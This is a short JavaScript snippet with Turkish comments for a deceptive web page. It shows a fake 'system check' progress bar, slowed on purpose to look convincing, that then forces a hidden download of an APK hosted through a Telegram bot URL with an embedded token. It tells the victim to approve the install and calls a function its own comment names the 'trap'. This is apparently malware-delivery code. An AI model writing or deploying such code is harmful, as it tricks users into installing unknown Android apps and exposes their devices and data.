document.getElementById('start-btn').addEventListener('click', function() {
    const bar = document.getElementById('bar');
    const status = document.getElementById('status');
    
    let width = 0;
    const interval = setInterval(() => {
        width += 1.5; // Bar yavaşça dolsun (inandırıcılık için)
        bar.style.width = width + "%";
        status.innerText = "Sistem kontrol ediliyor... %" + Math.round(width);

        if (width >= 100) {
            clearInterval(interval);
            
            // CORS'A TAKILMAYAN YÖNTEM:
            const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
            
            // Gizli bir link üzerinden indirmeyi zorla
            const a = document.createElement('a');
            a.href = apkUrl;
            a.target = "_self"; // Yeni sekme açmadan mevcut pencerede tetikle
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            status.innerHTML = "<b>İndirme Başlatıldı.</b><br>Lütfen alttaki bildirimden onayı tamamlayın.";
            
            // 2. ADIM: TUZAĞI BURADA AKTİF EDİYORUZ
            setupClickTrap();
        }
    }, 50);
});
